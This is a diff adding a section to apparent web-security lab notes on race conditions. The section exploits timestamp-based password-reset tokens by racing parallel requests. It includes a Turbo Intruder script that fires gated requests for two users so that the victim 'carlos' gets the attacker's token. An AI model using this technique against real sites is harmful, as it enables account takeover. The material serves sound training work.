@@ -119,3 +119,43 @@ Once we perform multiple email change requests in parrarel (using `single-packet
 Now we can try to perform `single-paket attack` sending 10 packets with email change for `carlos@ginandjuice.shop` and 10 for `wiener@exploit-0a2a005504941a6a821cff27015b0015.exploit-server.net`. This can be done via Turbo Intruder or grouped requests in the Repeater sent in parrarel.
 
 After that we can check the email and try to confirm verification token for `carlos@ginandjuice.shop` email, which will successfully change our email and grant us admin privillages.
+
+## Exploiting time-sensitive vulnerabilities
+
+PHP's native session handler module only processes one request per session at a time, so in order to test race conditions I was required to create multiple sessions with different csrf tokens.
+
+By performing a few sequential forgot password requests we do not see anything strange about the app behaviour. 
+
+But when performing a couple of those requests in parrarel, we can observe two received emails with the same token.   
+
+Once we test to reset our password one time providing our email and one time the username, we sometime see two email with the same token and some time with different once. We can assume, that the generated token maybe randomized only by the timestamp.
+
+Now using the script below, we can try to activate password change functionality for us `wiener` and for `carlos`, hoping to hit the same timestamp and receive the same token, which will allow change the user for other user.
+
+```
+def queueRequests(target, wordlists):
+
+    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
+    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
+    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=1,
+                           engine=Engine.BURP2
+                           )
+
+    # the 'gate' argument withholds part of each request until openGate is invoked
+    # if you see a negative timestamp, the server responded before the request was complete
+    
+    for session_id, csrf, uname in [('fpU9eJNCrVPH1oGBJsgUGkXcsCu9aTb7', 'CGsdoO0mHBv98drRzyCqwc5iyQ7yCkGb', 'wiener'), ('Y63zivWxO89NXZIm3TzV3HfDDVPQ7E5g', 'KLSRuP8v1GeQFZ3XkUKVSlfbb5LsrWxU', 'carlos')]:
+        engine.queue(target.req, [session_id, csrf, uname], gate='race1')
+
+    # once every 'race1' tagged request has been queued
+    # invoke engine.openGate() to send them in sync
+    engine.openGate('race1')
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+After couple of tries we are able to access `carlos` password change with the same token we received in the email.
